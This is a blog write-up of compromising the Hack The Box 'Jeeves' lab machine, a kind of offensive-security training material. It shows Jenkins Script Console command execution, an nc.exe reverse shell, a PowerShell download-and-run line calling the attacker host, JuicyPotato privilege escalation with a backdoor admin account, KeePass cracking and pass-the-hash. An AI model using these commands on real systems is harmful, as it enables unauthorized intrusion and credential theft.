---
layout: post
title:  "Jeeves Writeup - Hack The Box"
date:   2023-11-08
desc: ""
keywords: "HTB,eJPT,eWPT,Jenkins Exploitation,RottenPotato,PassTheHash,Breaking Keepass,Alternate Data Streams,OSCP,Medium"
categories: [HTB]
tags: [HTB,eJPT,eWPT,OSCP,Windows,Jenkins,RottenPotato,PassTheHash,Keepas,ADS,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

It's time to strengthen concepts related to **Windows** (cmd, powershell, etc), so now I'm going to try to break [HTB's](https://www.hackthebox.com){:target="_blank"} **Jeeves** machine. It's ranked as medium, so I think I'm going to learn several concepts related to cybersecurity, here I go.

<br/><br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves.png" width="100%" style="margin: 0 auto;display: block
; max-width: 400px;">
<br/><br/>

I deploy the box with **[htbExplorer](https://github.com/s4vitar/htbExplorer){:target="_blank"}** and I can send a packet with `ping` to check the correct connectivity with the box. I am also going to check the **OS** it has with the S4vitar **[whichSystem.py](https://pastebin.com/MJKeviqb){:target="_blank"}** script. I can also get information about the open ports that are exposed on the victim machine, thanks to `nmap`.

```bash
./htbExplorer -d Jeeves
```

```bash
python3 /usr/bin/whichSystem.py 10.10.10.63
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.63 -oG allPorts
```

<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_00.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I use the `nmap` scripts I can know the services and their versions, exposed on the machine to attack. With `crackmapexec` I can delve deeper into the **SMB** service and with `whatweb` I know a little more about the technologies used in the web service. I can know that the **SMB** protocol is not signed and that it uses an **IIS** web server, things that I can try to exploit.

```bash
nmap -sCV -p80,135,445,50000 10.10.10.63 -oN targeted
cat targeted
whatweb http://10.10.10.63
```

<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_01.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_02.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I access the exposed web service on port **80** from the browser and perform some actions, I see that it does not have any functionality enabled. I can't find subdirectories with `wfuzz` either, but there is also a service with **HTTP** on port **50000**, called **Jetty**, where no functionality is available either.

> **Eclipse Jetty** is a Java web server and Java Servlet container. While web servers are usually associated with serving documents to people, Jetty is now often used for machine to machine communications, usually within larger software frameworks.

```bash
cat targeted | grep http

wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.63/FUZZ
```

<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_03.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_04.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_05.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now if I look for directories in the port **50000** web service with `wfuzz`, after a long time of waiting, I find a very interesting one (**askjeeves**), if I access it from the browser I enter the dashboard of a **Jenkins**.

> **Jenkins** is an open source continuous integration/continuous delivery and deployment (*CI/CD*) automation software DevOps tool written in the **Java** programming language. It is used to implement CI/CD workflows, called pipelines. Pipelines automate testing and reporting on isolated changes in a larger code base in real time and facilitates the integration of disparate branches of the code into a main branch. They also rapidly detect defects in a code base, build the software, automate testing of their builds, prepare the code base for deployment (delivery), and ultimately deploy code to containers and virtual machines, as well as bare metal and cloud servers. There are several commercial versions of Jenkins. This definition only describes the upstream open source project.

```bash
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.63:5000/FUZZ
```

<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_06.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_07.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>

There is a way to perform an **[RCE in Jenkins](https://medium.com/@awezkagdi.ak/remote-code-execution-a-story-of-simple-rce-on-jenkins-instance-4f01ea098269){:target="_blank"}**, because it is accessible from the administration panel, where there is the functionality of a **Script Console**, from which you can declare commands (most likely in **Ruby** language). If I search the internet for **[groovy execute shell command](https://stackoverflow.com/questions/159148/groovy-executing-shell-commands){:target="_blank"}**, I find some examples, and I try to obtain the results of an RCE. Leaving your [Jenkins](https://www.shodan.io/search?query=jenkins){:target="_blank"} management system exposed can be very dangerous, a large number of Jenkins are currently exposed.

```ruby
"ls /".execute().text                   # :(
'ls /'.execute().text                   # :(

println "whoami".execute().text         # :)
println "ipconfig".execute().text       # :)

command = "whoami"
println(command.execute().text)
```

<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_08.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_09.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_10.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_11.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now I try to send me a **Reverse Shell**, first I use `impacket-smbserver` to set up a **SMB** server and from there I will share the `nc.exe` binary, so I can access it from the victim machine and run it and send me the **Reverse Shell**, I try different commands until I succeed, I have to escape the `\`.
When accessing the `nc.exe` binary from the victim machine, the **NTML** hash of the user **kohsuke** can be seen.

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
rlwrap nc -nlvp 443
```

```ruby
println "\\10.10.14.6\smbFolder\nc.exe -e cmd 10.10.14.6 443".execute().text
println "\\\\10.10.14.6\\smbFolder\\nc.exe -e cmd 10.10.14.6 443".execute().text

command = "\\10.10.14.6\smbFolder\nc.exe -e cmd 10.10.14.6 443"
println(command.execute().text)

command = "\\\\10.10.14.6\\smbFolder\\nc.exe -e cmd 10.10.14.6 443"
println(command.execute().text)

command = "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6/PS.ps1')"
println(command.execute().text)

```

<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_12.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_13.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_14.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_15.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_16.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>

The **Reverse Shell** left me in a directory inside the **Administrator** user's home, if I enumerate a little its content I can access to several files that contain several hashes, I could try to crack them somehow, but I don't think it would be a good attack vector for the moment. Can perform a search in the directories and their subdirectories, using the **`/s`** parameter of the `dir` command, looking for the user's flag and I can now access its contents, the first phase is already completed.

```cmd
dir /s
```

<br/><br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_17.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_18.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_19.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If we search the system for the security privileges of the user we are connected to, we find the `SeImpersonatePrivilege` ([Impersonate a client after authentication](https://learn.microsoft.com/es-es/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege){:target="_blank"}) which will allow us to escalate privileges. If we search the internet for **set impersonate privilege exploit** we find a page, [Impersonating Privileges with Juicy Potato](https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505){:target="_blank"}, where we can find information on how to exploit this privilege. I download the **[Juicy Potato](https://github.com/ohpe/juicy-potato/){:target="_blank"}** exploit and try to [download it to the victim machine](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/){:target="_blank"} in several ways until I succeed.

> **Juicy potato** is basically a weaponized version of the **RottenPotato** exploit that exploits the way Microsoft handles tokens. Through this, we achieve privilege escalation.

```bash
python3 -m http.server 80
```

```cmd
certutil.exe -f -urlcache -slip http://10.10.14.6/jp.exe                                    # :(
IWR -uri http://10.10.14.6/jp.exe -OutFile jp.exe                                           # :(
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6/jp.exe')         # :(
```

<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_20.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_21.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_22.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I realize that I am executing the commands wrong, as I am in a **`cmd`** console and not a **`powershell`**. I run the command correctly and I have the `JuicyPotato` executable on the victim machine. I check that the exploit works correctly and I can now follow the steps to achieve privilege escalation, first I must [create a user to a Window PC](https://www.wikihow.com/Add-Users-from-CMD){:target="_blank"}, and I check that the command I passed to the exploit has been executed, with `crackmapexec` I can also corroborate the existence of the created user.

```cmd
powershell iwr -uri http://10.10.14.6/jp.exe -OutFile jp.exe
./jp.exe

jp.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user olboy oldboy123 /add"
net user
# :)
```

```bash
poetry run crackmapexec smb 10.10.10.63 -u 'oldboy' -p 'oldboy123'
```

<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_23.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_24.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_25.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

The next step is to add the newly created user to the **Administrators Group**, to have the necessary privileges to run binaries and to be able to send me a **Reverse Shell**. The command runs successfully, I can confirm that the user was added, but using `crackmapexec` I see that the machine still cannot be **pwned**.

```cmd
.\jp.exe -t * -l 1337  -p C:\\Windows\System32\cmd.exe -a "/c net localgroup administrators oldboy /add"
net user oldboy
```

```bash
poetry run crackmapexec smb 10.10.10.63 -u 'oldboy' -p 'oldboy123'
```

<br/><br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_26.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_27.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

In case it still does not work, I can create a network share, on which I have write permissions, for `Juicy Potato` needs to upload a malicious file on the machine (**I have seen in other resolutions, that this step is not necessary**). I must also create a **[LocalAccountTokenFilterPolicy key](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction){:target="_blank"}**, and once I have executed the commands with `Juicy Potato`, I check again with `crackmapexec` and I can see that the box has been pwned. I can now use the `impacket-psexec` tool (allows users to run programs on remote systems) and get a powershell as the **nt authority\system** user.

```cmd
.\jp.exe -t * -l 1337  -p C:\\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL"                     # Optional in this machine!

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System

.\jp.exe -t * -l 1337  -p C:\\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
```

```bash
poetry run crackmapexec smb 10.10.10.63 -u 'oldboy' -p 'oldboy123'              # (Pwn3d!)
impacket-psexec WORKGROUP/oldboy@10.10.10.63 cmd.exe                           # :):):)
```

<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_28.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_29.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_30.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>

If I look for the last flag, I look first of all in the **Administrator** user's Desktop directory, but it is not there, and if I look in different common directories, I can't find anything either. I start to believe that the **root.txt** file is hiding, and **Alternative data streams** concept is being used, so I use the `/r` parameter of the `dir` command, and I can see the file, I use the `more` binary to get its content.

```cmd
type hm.txt

dir /r
more < ht.txt:root.txt
```

<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_31.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

There is another way to pwned the box. When I did the system enumeration, I noticed a very interesting file (**CEH.kdbx**), it seems to be the **DB** of the **KeePass** password manager, I transfer it to my machine. I know that to access the contents of this **DB**, I must have a master password. There is a tool, `keepass2john`, that allows me to obtain a hash and then I use `john` to crack and obtain the password. I can now access the database with the `keepassxc` tool. 

> A **[KDBX file](https://fileinfo.com/extension/kdbx){:target="_blank"}** is a password database created by KeePass Password Safe, a free password manager for Windows. It stores an encrypted database of passwords that can be viewed only using a master password set by the user. KDBX files are used to securely store personal login credentials for Windows, email accounts, FTP sites, e-commerce sites, and other purposes.

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

```cmd
copy CEH.kdbx \\10.10.14.6\smbFolder\
```

```bash
locate keepass2john
/usr/bin/keepass2john CEH.kdbx > hash

john --wordlist=/usr/share/wordlists/rockyou.txt hash

keepassxc CEH.kdbx
```

<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_32.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_33.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_34.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now that I can see the content of the database, I find a hash, what I am going to do, is to validate it first with `crackmapexec` and if it tells me **Pwned!**, I can perform a **PassTheHash** with `psexec`. I enter the commands and everything goes fine and I am already logged in as the user with maximum privileges.

```bash
poetry run crackmapexec smb 10.10.10.63 -u 'administrator' -H 'e0fb1fb85756c24235ff238cbe81fe00'
impacket-psexec WORKGROUP/administrator@10.10.10.63 -hashes :e0fb1fb85756c24235ff238cbe81fe00
```

<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_35.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_36.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/jeeves_writeup/Jeeves_37.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

> Windows machines are my Achilles heel, I will keep practicing to assimilate all the concepts, it's time to kill the box and choose the next one, here we go!

```bash
htbExplorer -k Jeeves
```
